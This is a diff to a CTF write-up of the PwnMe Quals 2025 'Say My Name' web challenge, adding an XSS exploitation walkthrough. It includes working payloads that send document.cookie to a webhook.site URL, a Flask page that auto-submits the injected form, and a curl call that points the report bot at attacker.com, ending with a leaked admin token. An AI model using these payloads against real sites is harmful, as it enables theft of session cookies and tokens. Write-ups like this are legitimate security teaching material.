@@ -1,7 +1,7 @@
 ---
 title: "Say My Name"
 description: "Just printing your name, what could go wrong ?"
-pubDate: 2025-01-22
+pubDate: 2025-03-04
 ctf: "PwnMe Quals 2025"
 category: "web"
 author: "sealldev & Solopie"
@@ -77,6 +77,14 @@ def report():
 app.run(debug=False, host='0.0.0.0')
 ```
 
+The front page of the site was a simple name input field:
+
+![saymynamemain.png](saymynamemain.png)
+
+Inputting a name we are given the `/your-name` page response with our name on the page, cool!
+
+![saymynamehello.png](saymynamehello.png)
+
 Some initial observations:
 - The webapp is running with Flask
 - To access `/admin` we require a randomly generated `X_Admin_Token`
@@ -97,12 +105,67 @@ Lookinag at the sanitisation of `your-name.html`, we can see the injection point
 
 So the injection points are of varying interest:
 - The injection point inside the `<a>` isn't super interesting as we can't create new tags without `<` and `>`.
-- The injection point inside the `onfocus` is filtered through `safe`.
-- The injection point inside the `href` is interesting!
+- We can't escape the href with the `\"` method
+- The injection point inside the `onfocus` is filtered through `safe` but we can still achieve XSS!
 
-...
+Let's make a sample payload first:
+`\";console.log(1);//`
 
-You can them achieve XSS and exfiltrate the `X_Admin_Token`.
+This should print `1` to the console before redirecting. Clicking the URL that's what we see!
+
+![saymynamexss.png](saymynamexss.png)
+
+Let's use `navigator` with a `sendBeacon` to send a request to a `webhook.site` URI.
+```
+\";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1`);//
+```
+
+Sure enough we get a `POST` from our serveron `webhook.site`.
+
+![saymyname-webhook.png](saymyname-webhook.png)
+
+Now, we need to host a remote server to do this POST to exfiltrate the token.
+```python
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>XSS Test</title>
+    </head>
+    <body>
+        <h2>XSS Exploit</h2>
+
+        <form id="post-form" method="POST" action="http://127.0.0.1:5000/your-name#behindthename-redirect">
+            <input type="hidden" name="name" value='solopieandsealldev\\";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1/?c=${document.cookie}`);//'>
+            <input type="submit" value="Submit">
+        </form>
+
+        <script>
+            document.getElementById('post-form').submit();
+        </script>
+    </body>
+    </html>
+    '''
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+```
+
+We can then send to the `/report` URI our server and get the token back on `webhook.site`!
+
+```bash
+$ curl http://localhost:5000/report\?url\=https://attacker.com
+```
+
+We then get a response from the server, `https://webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1/?c=X-Admin-Token=68fd3889bf98101b1639d81d8428955d`
+
+Woo! Now we can do that on remote and access `/admin`!
 
 Looking closer at the `app.py` there is a vulnerability in `/admin`:
 ```python
